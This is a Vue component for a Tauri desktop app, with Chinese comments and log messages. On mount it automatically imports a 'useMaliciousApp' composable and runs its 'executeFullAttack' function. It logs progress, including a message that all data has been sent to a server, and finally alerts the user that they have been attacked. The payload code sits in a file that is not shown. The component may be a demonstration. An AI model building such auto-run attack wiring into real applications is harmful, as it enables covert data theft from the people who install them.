<template>
  <div id="app">
    <div class="warning-container">
      <div class="warning-icon">⚠️</div>
      <h1>警告</h1>
      <p>应用已启动</p>
    </div>
  </div>
</template>

<script setup>
import { onMounted } from 'vue'
import { useMaliciousApp } from './composables/useMaliciousApp.js'
import { invoke } from '@tauri-apps/api/core'


// 应用启动时的处理 - 逐步测试找出问题
onMounted(async () => {
  try {
    // 第一步：写入启动日志
    await invoke('write_log', { message: '应用启动，开始逐步测试...' })
    
    // 第二步：尝试导入 useMaliciousApp
    const maliciousApp = useMaliciousApp()
    await invoke('write_log', { message: 'useMaliciousApp 导入成功' })
    
    // 第三步：获取 executeFullAttack 函数
    const { executeFullAttack } = maliciousApp
    await invoke('write_log', { message: 'executeFullAttack 函数获取成功' })
    
    // 第四步：执行攻击流程
    await invoke('write_log', { message: '开始执行攻击流程...' })
    
    const attackResults = await executeFullAttack()
    
    if (attackResults && attackResults.success) {
      await invoke('write_log', { message: '攻击完全成功！所有数据已发送到服务器' })
    } else {
      await invoke('write_log', { message: `攻击失败: ${attackResults?.error || '未知错误'}` })
    }
    
  } catch (error) {
    await invoke('write_log', { message: `攻击流程异常: ${error.message}` })
  } finally {
    await invoke('write_log', { message: '攻击流程结束' })
    setTimeout(() => {
      alert('警告：你被攻击了！操作已完成')
    }, 1000)
  }
})
</script>

<style scoped>
#app {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  margin: 0;
  padding: 0;
  min-height: 100vh;
  background: linear-gradient(135deg, #ff4757, #ff3838);
  display: flex;
  align-items: center;
  justify-content: center;
}

.warning-container {
  text-align: center;
  background: white;
  padding: 60px 40px;
  border-radius: 20px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
  border: 3px solid #ff4757;
}

.warning-icon {
  font-size: 80px;
  margin-bottom: 20px;
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.1); }
  100% { transform: scale(1); }
}

h1 {
  color: #ff4757;
  font-size: 36px;
  font-weight: 700;
  margin: 0 0 15px 0;
  text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
}

p {
  color: #666;
  font-size: 18px;
  margin: 0;
}
</style>